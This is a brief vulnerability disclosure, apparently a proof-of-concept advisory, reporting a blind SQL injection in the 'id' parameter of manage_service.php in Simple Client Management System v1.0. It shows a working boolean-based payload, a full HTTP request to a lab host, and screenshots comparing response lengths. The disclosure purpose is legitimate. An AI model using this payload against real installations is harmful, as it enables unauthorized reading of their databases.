# Simple-Client-Management-System v1.0 by oretnom23 has SQL injection

**Author：** k0xx

vendors: https://www.sourcecodester.com/php/15027/simple-client-management-system-php-source-code.html

Vulnerability File: /cms/admin/maintenance/manage_service.php?id=

Vulnerability location: /cms/admin/maintenance/manage_service.php?id=,id

[+] Payload: /cms/admin/maintenance/manage_service.php?id=1%27%20and%20length(database())%20=6%20--+  // Leak place ---> id

Current database name: cms_db,length is 6

```sql
GET /cms/admin/maintenance/manage_service.php?id=1%27%20and%20length(database())%20=6%20--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=3m0l1n81dvmlo0a3h9oo72q1gp
Connection: close
// Leak place ---> id
```


When length (database ()) = 6, Content-Length: 2397
![image](https://user-images.githubusercontent.com/54017627/164883725-3ea83b5f-b44b-45d9-812a-4436a3b7c2df.png)

![image](https://user-images.githubusercontent.com/54017627/164883744-b67f56e9-0f9c-4642-af05-3721647892ec.png)


When length (database ()) = 7, Content-Length: 2355
![image](https://user-images.githubusercontent.com/54017627/164883735-85f30c79-c2e9-41cc-b8aa-c600071cf083.png)

![image](https://user-images.githubusercontent.com/54017627/164883749-30538708-b0ef-45ec-abd0-eae31bb9b68e.png)
